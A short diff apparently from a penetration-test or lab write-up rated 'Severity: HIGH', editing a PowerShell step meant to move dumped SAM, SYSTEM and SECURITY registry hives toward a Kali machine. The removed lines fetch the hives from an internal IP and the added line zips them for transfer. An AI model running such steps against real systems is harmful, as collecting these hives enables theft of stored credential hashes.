@@ -54,9 +54,5 @@ Severity: HIGH
 > First, let's use powershell to send the files to Kali:
 
 ```shell
-$files = @("SYSTEM-2025-02-11", "SECURITY-2025-02-11", "SAM-2025-01-15")
-foreach ($file in $files) {
-    Write-Host "[*] Attempting to fetch: $file" -ForegroundColor Cyan
-    Invoke-WebRequest -Uri "http://172.16.220.130/$file" -OutFile "C:\Windows\Tasks\$file" -ErrorAction SilentlyContinue
-}
+Compress-Archive -Path "C:\Windows\Tasks\SYSTEM-2025-02-11", "C:\Windows\Tasks\SECURITY-2025-02-11", "C:\Windows\Tasks\SAM-2025-01-15" -DestinationPath "C:\Windows\Tasks\hives.zip"
 ```
